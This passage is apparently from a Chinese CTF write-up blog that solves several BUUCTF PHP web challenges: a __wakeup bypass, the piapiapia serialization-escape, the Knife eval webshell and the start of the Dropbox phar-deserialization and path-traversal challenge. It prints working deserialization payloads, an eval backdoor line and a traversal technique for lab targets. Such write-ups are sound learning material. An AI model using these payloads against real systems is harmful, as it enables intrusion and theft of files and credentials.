<p><strong>关于wakeup()函数：</strong><br>与<strong>sleep()函数相反，</strong>sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。<br>绕过方法：<br><strong>当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。</strong></p>
<p>我们可以看到，需要绕过<code>wakeup()</code>函数，然后令<code>username==admin</code>，<code>password==100</code>才能执行<code>echo $flag</code>，因此需要构造这两个条件，但是我们发现，这两个字段都是<code>private</code>定义的，绕过的时候需要更改序列化之后属性的格式：</p>
<ul>
<li>1、private属性序列化的时候格式是 %00类名%00成员名</li>
<li>2、protected属性序列化的时候格式是 %00*%00成员名</li>
</ul>
<p>可参考：<a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">https://www.cnblogs.com/fish-pompom/p/11126473.html</a><br>根据这些信息我们便可以构造payload。</p>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>首先在<code>class.php</code>中加入下列代码，得到一个实例化对象的反序列化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
<p>拿到反序列化的字符串：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Name"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Nameusername"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Namepassword"</span>;<span class="attribute">i</span>:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们把属性值<code>2</code>改成<code>3</code>以绕过<code>wakeup()</code><br>最后更改两个属性名的格式如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Name"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="attribute">i</span>:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>最后，在<code>index.php</code>中我们发现GET传参<code>select</code>，构造最终payload</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>即可拿到flag。</p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>一道反序列化逃逸漏洞利用题目。</p>
<h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后是一个登录页面，尝试登录管理员，失败，也没有注册按钮…<br>通过扫后台发现存在<a href="http://www.zip文件，果断下载了，成功拿到题目源码。压缩包下包含`class.php`、`config.php`、`index.php`、`profile.php`、`register.php`、`update.php`几个有用的文件。" target="_blank" rel="noopener">www.zip文件，果断下载了，成功拿到题目源码。压缩包下包含`class.php`、`config.php`、`index.php`、`profile.php`、`register.php`、`update.php`几个有用的文件。</a><br>解题关键在于如下部位：<br>首先是<code>config.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">	$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由此可知，flag存在于该文件之下，需要想办法读取改文件内容。<br>同时，在<code>profile.php</code>文件下有与读取文件内容相关的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Login First'</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">		header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可知，控制<code>photo</code>变量为<code>config.php</code>我们便可以读取到其内容。同时看到，这里存在一个反序列化的函数，初步判断解题与它相关。<br>在<code>update.php</code>文件中找到了将字符串序列化的地方：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Login First'</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">		<span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">		$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">		$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">		$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">		$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，此处的代码是对<code>profile</code>数组中的<code>phone</code>、<code>email</code>、<code>nickname</code>、<code>photo</code>进行的序列化，序列化之后的效果如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"phone"</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"11111111111"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"email"</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"123@qq.com"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"nickname"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"photo"</span>;<span class="attribute">s</span>:<span class="number">39</span>:<span class="string">"upload/f3b94e88bd1bd325af6f62828c8785dd"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>a:4</code>指的是由一个<code>数组</code>序列化而来，并且有<code>4</code>个值。如果是<code>对象</code>的话，就是把<code>a</code>改成<code>O</code>。然后是一个键值名，一个变量值：<br><code>s:5:&quot;phone&quot;</code>:第一个键名，是string类型的，长度为五;<code>s:11:&quot;11111111111&quot;</code>:第一个变量值，string类型，长度为11。后面的也是这个规律。这里存在我们要利用的反序列化漏洞：<strong>如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的</strong>。<br>最后在<code>class.php</code>文件中还有两个需要过滤，并且对拿flag有效的正则匹配：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">	$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">	$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">	$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">	$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会对我们输入的内容进行替换，比如将<code>where</code>替换为<code>hacker</code>，这对我们的解题很重要。</p>
<p>至此，解题思路已经很明确了，就是我们通过控制输入，将序列化之后的<code>photo</code>对应上<code>config.php</code>，通过抓包发现<code>nickname</code>是入手点，从前面写到的序列化的字符串也能看出来。因此在<code>nickname</code>后面加上<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>就能实现，最后效果如下：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">a:</span><span class="number">4</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"phone"</span>;<span class="string">s:</span><span class="number">11</span>:<span class="string">"11111111111"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"email"</span>;<span class="string">s:</span><span class="number">11</span>:<span class="string">"123@qq.com"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">a:</span><span class="number">1</span>:&#123;<span class="string">i:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">3</span>:<span class="string">"123"</span>;&#125;<span class="string">s:</span><span class="number">5</span>:<span class="string">"photo"</span>;<span class="string">s:</span><span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">s:</span><span class="number">39</span>:<span class="string">"upload/f3b94e88bd1bd325af6f62828c8785dd"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这里就实现了<code>photo</code>与<code>config.php</code>的对应，而括号后面的<code>upload</code>等不会被执行。注意这里我们看到<code>nickname</code>是一个<strong>数组型</strong>的，因为我们前面提到过，有对<code>nickname</code>的正则匹配，所有我们需要用数组来绕过。<br>现在的问题就是<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>这34字符，使我们在传参的时候要手动加入到<code>nickname</code>数组中的，而想要打到我们的目的，就必须把它们从<code>nickname</code>数组中挤出去，这个时候我们前面说到的<code>where</code>与<code>hacker</code>的替换就派上用场了：我们可以在    <code>nickname</code>数组中写入<code>34</code>个<code>where</code>，那么就替换成了<code>34</code>个<code>hacker</code>，但是序列化之后的每个变量名和常量值都是有定值的，比如上面的<code>s:5</code>表示长度是5，所以替换之后，34个<code>where</code>之后紧跟的<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>就不在属于<code>nickname</code>数组了，也就达到了我们的目的，部分payload如下：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>我们首先先到<code>register.php</code>下注册个账号，登录之后更新用户的信息，这个时候通过BP抓包写入payload，然后将<code>nickname</code>改成<code>nickname[]</code>，同时将我们构造好的payload写入，如图：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web19.png" alt=""><br>从响应包中，我们看到，payload已经成功打入，此时，我们上传的图片存放的路径读取的也就是<code>config.php</code>的内容了，此时去<code>profile.php</code>下打开图片的链接即可看到一串base64，解码即可拿到flag。</p>
<p>这道题目对反序列化漏洞的认识又进一步加深，学到了学到了。</p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>进入题目，解题方法就很明显了，提示了<code>Knife</code>，并且给了后门语句<code>eval($_POST[&quot;Syc&quot;]);</code>，用蚁剑连接下列链接：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">http://514be013<span class="string">-67</span>a5<span class="string">-422</span>b-ae7b<span class="string">-941</span>c105e248b.node3.buuoj.cn/?Knife.php</span><br></pre></td></tr></table></figure>
<p>连接密码很明显：<code>Syc</code>，连接即可拿flag。</p>
<h2 id="CISCN2019-华北-Dropbox"><a href="#CISCN2019-华北-Dropbox" class="headerlink" title="[CISCN2019 华北]Dropbox"></a>[CISCN2019 华北]Dropbox</h2><p>一个考察<code>phar</code>反序列化的问题。<br>相关知识参考：<br><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后，通过注册并登录账户，发现可以上传文件，上传文件之后进入到管理面板，这个时候我们发现可以对我们的文件进行<code>下载</code>和<code>删除</code>的操作：<br>这个地方存在可以的地方，在下载文件的时候，抓包发现，下载文件的规则很简单：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web21.png" alt=""><br>那么我们可以测试是否可以下载别的文件，通过改包利用<code>../../xxx.php</code>测试可行性，结果真的能下载文件：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web22.png" alt=""><br>通过下载<code>index.php</code>文件，我们依次下载到关键的<code>class.php</code>和<code>delete.php</code>文件，内容如下：<br>class.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们看到，其中有多个类的定义，其中<code>delete()</code>函数中的<code>unlink()</code>引起注意，因为这个函数在处理<code>phar</code>文件时会<strong>将序列化的内容反序列化</strong>，这一点在前面提供的第二个链接有讲到，还提到了其他的函数，如下:<br><img src="http://www.ggb0n.cool/images/BUUCTF-web26.png" alt=""><br>再看delete.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
